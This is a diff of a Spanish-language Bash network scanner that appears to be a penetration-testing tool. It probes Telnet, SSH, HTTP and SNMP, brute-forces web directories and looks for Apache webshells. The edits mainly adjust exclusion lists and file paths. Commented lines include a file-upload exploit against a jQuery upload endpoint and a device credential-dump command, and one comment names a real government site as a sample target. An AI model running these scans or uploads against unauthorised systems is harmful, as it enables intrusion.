@@ -5187,7 +5197,7 @@ then
 	do     						
 		echo -e "[+] Escaneando $ip"	
 		
-		egrep -iq "23/open" .escaneo_puertos_1000p/"$ip"_tcp.grep
+		egrep -iq "23/open" .escaneo_puertos_banners/"$ip".grep
 		greprc=$?
 		if [[ $greprc -eq 0 ]] ; then			
 			echo -e "\t Probando Telnet \n $RESET"
@@ -5203,7 +5213,7 @@ then
 			
 		fi		
 
-		egrep -iq "22/open" .escaneo_puertos_1000p/"$ip"_tcp.grep
+		egrep -iq "22/open" .escaneo_puertos_banners/"$ip".grep
 		greprc=$?
 		if [[ $greprc -eq 0 ]] ; then			
 			echo -e "\t Probando SSH \n $RESET"
@@ -5235,7 +5245,7 @@ then
 	do     						
 		echo -e "[+] Escaneando $ip"	
 		
-		egrep -iq "23/open" .escaneo_puertos_1000p/"$ip"_tcp.grep
+		egrep -iq "23/open" .escaneo_puertos_banners/"$ip".grep
 		greprc=$?
 		if [[ $greprc -eq 0 ]] ; then			
 			echo -e "\t Probando Telnet \n $RESET"
@@ -5252,7 +5262,7 @@ then
 			
 		fi		
 
-		egrep -iq "22/open" .escaneo_puertos_1000p/"$ip"_tcp.grep
+		egrep -iq "22/open" .escaneo_puertos_banners/"$ip".grep
 		greprc=$?
 		if [[ $greprc -eq 0 ]] ; then			
 			echo -e "\t Probando SSH \n $RESET"
@@ -5303,7 +5313,7 @@ then
 	do     						
 		echo -e "[+] Escaneando $ip"	
 		
-		egrep -iq "23/open" .escaneo_puertos_1000p/"$ip"_tcp.grep
+		egrep -iq "23/open" .escaneo_puertos_banners/"$ip".grep
 		greprc=$?
 		if [[ $greprc -eq 0 ]] ; then			
 			echo -e "\t Probando Telnet \n $RESET"
@@ -5323,7 +5333,7 @@ then
 		#exploit 
 		#sendcmd 1 DB p DevAuthInfo
 
-		egrep -iq "22/open" .escaneo_puertos_1000p/"$ip"_tcp.grep
+		egrep -iq "22/open" .escaneo_puertos_banners/"$ip".grep
 		greprc=$?
 		if [[ $greprc -eq 0 ]] ; then			
 			echo -e "\t Probando SSH \n $RESET"
@@ -5345,7 +5355,7 @@ then
 		#sendcmd 1 DB p DevAuthInfo	
 		
 		
-		egrep -iq "80/open" .escaneo_puertos_1000p/"$ip"_tcp.grep
+		egrep -iq "80/open" .escaneo_puertos_banners/"$ip".grep
 		greprc=$?
 		if [[ $greprc -eq 0 ]] ; then			
 			echo -e "\t Probando HTTP \n $RESET"	
@@ -5384,7 +5394,7 @@ find servicios -size  0 -print0 |xargs -0 rm 2>/dev/null # borrar archivos vacio
 				echo -e "\t[+] Enumerando con el comunity string: $community"
 				
 				###### Revisar si no es impresora ######				
-				if [[ ( ${device} == *"Printer"* || ${device} == *"JetDirect"*  || ${device} == *"LaserJet"* || ${device} == *"KONICA"* || ${device} == *"MULTI-ENVIRONMENT"* ) || (  -e ".vulnerabilidades/"$ip"_161_snmpCommunity.txt" )]];then 
+				if [[ (  ${device} == *"RICOH"* || ${device} == *"Printer"* || ${device} == *"JetDirect"*  || ${device} == *"LaserJet"* || ${device} == *"KONICA"* || ${device} == *"MULTI-ENVIRONMENT"* ) || (  -e ".vulnerabilidades/"$ip"_161_snmpCommunity.txt" )]];then 
 					echo -e "\t$OKGREEN[i] Es una impresora o ya fue enumerado $RESET"
 					echo ""
 				else
@@ -5484,7 +5494,7 @@ insert_data
 if [ "$MODE" != "proxy" ]; then 
 	IFS=$'\n'  # make newlines the only separator
 	echo -e "$OKBLUE #################### Realizar escaneo de directorios (2do nivel) a los directorios descubiertos ######################$RESET"	    
-	for line in $(cat .enumeracion2/*webdirectorios.txt 2>/dev/null); do	
+	for line in $(cat .enumeracion2/*webdirectorios.txt | uniq 2>/dev/null); do	
 		echo -e "\n\t########### $line #######"										
 		#line= 200	https://inscripcion.notariadoplurinacional.gob.bo:443/manual/ (Listado directorio activo)	 ,
 		while true; do
@@ -5499,7 +5509,7 @@ if [ "$MODE" != "proxy" ]; then
 					port=`echo $ip_port | cut -d ":" -f 2`		
 					path=`echo $line | cut -d "/" -f4 | tr '[:upper:]' '[:lower:]'` #minuscula
 				
-						if [[ (${path} != *"xmlrpc"* && ${path} != *"manual"* && ${path} != *"dashboard"* && ${path} != *"docs"* && ${path} != *"license"* && ${path} != *"wp"* && ${path} != *"manual"*  && ${path} != *"manual"*  && ${path} != *"manual"* && ${path} != *"manual"* && ${path} != *"manual"* ) ]];then 
+						if [[ (${path} != *"xmlrpc"* && ${path} != *"manual"* && ${path} != *"dashboard"* && ${path} != *"docs"* && ${path} != *"license"* && ${path} != *"wp"* && ${path} != *"aspnet_client"*  && ${path} != *"manual"*  && ${path} != *"manual"* && ${path} != *"manual"* && ${path} != *"manual"* ) ]];then 
 						echo -e "\t\t[+] Enumerando directorios de 2do nivel ($path)" 
 						web-buster.pl -t $ip -p $port -s $proto -h $hilos_web -d "/$path/" -m folders >> logs/enumeracion/"$ip"_"$port"_webdirectorios2.txt &
 											
@@ -5509,7 +5519,7 @@ if [ "$MODE" != "proxy" ]; then
 						#curl -F "files=@/usr/share/lanscanner/info.php" http://10.11.1.123/books/apps/jquery-file-upload/server/php/index.php > logs/vulnerabilidades/"$ip"_"$port"_jqueryUpload.txt
 						#grep "info.php" logs/vulnerabilidades/"$ip"_"$port"_jqueryUpload.txt > .vulnerabilidades/"$ip"_"$port"_jqueryUpload.txt
 		
-						egrep -i "apache|nginx" .enumeracion2/"$ip"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud" # solo el segundo egrep poner "-q"
+						egrep -i "apache|nginx" .enumeracion2/"$ip"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs" # solo el segundo egrep poner "-q"
 						greprc=$?				
 						if [[ $greprc -eq 0 ]];then # si el banner es Apache
 							web-buster.pl -t $ip -p $port -s $proto -h $hilos_web -d "/$path/" -m backdoorApache  -o 0 | egrep --color=never "^200"  >> .vulnerabilidades/"$ip"_"$port"_webshell.txt &
@@ -5811,7 +5821,7 @@ then
 		echo "$line;$web_fingerprint" >> servicios/admin-web2.txt	
 		
 		if [[ ${path} != *"."* && ${web_fingerprint} != *"index of"* ]];then  # si es un directorio (no un archivo) y el listado de directorios no esta habilitado
-			egrep -i "apache|nginx" .enumeracion2/"$ip"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud|webadmin|owa" # solo el segundo egrep poner "-q"
+			egrep -i "apache|nginx" .enumeracion2/"$ip"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs|webadmin|owa" # solo el segundo egrep poner "-q"
 			greprc=$?
 			# si no es tomcat/phpmyadmin/joomla descubrir rutas de 2do nivel accesibles
 			if [[ $greprc -eq 0 && $web_fingerprint != *"tomcat"* && $web_fingerprint != *"phpmyadmin"*  && $web_fingerprint != *"joomla"*  && $web_fingerprint != *"wordpress"* && $web_fingerprint != *"cms"*  && $web_fingerprint != *"sqlite"* && $line != *"Listado directorio"* && $line != *".php"*  && $line != *".html"*  ]];then 
